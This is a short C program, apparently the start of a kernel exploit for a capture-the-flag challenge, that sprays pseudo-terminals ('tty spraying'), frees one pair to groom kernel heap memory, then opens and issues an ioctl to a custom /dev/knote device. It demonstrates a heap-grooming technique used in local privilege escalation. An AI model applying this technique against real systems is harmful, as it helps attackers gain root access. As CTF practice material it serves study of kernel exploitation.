#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <pty.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define ALLOC_NUM 128

int main()
{
	int i, j;
	int fd;
	int m_fd[ALLOC_NUM], s_fd[ALLOC_NUM];

	puts("[+] let's start :)");

	/* tty spraying */
	for (i = 0; i < ALLOC_NUM; ++i) {
		if (openpty(&m_fd[i], &s_fd[i], NULL, NULL, NULL) == -1) {
			puts("[-] pty creation failed");
		}
	}

	close(m_fd[64]);
	close(s_fd[64]);

	fd = open("/dev/knote", O_RDWR);
	if (fd < 0) {
		puts("[-] device open failed");
	}	

	ioctl(fd, 0, NULL);

	return 0;
}


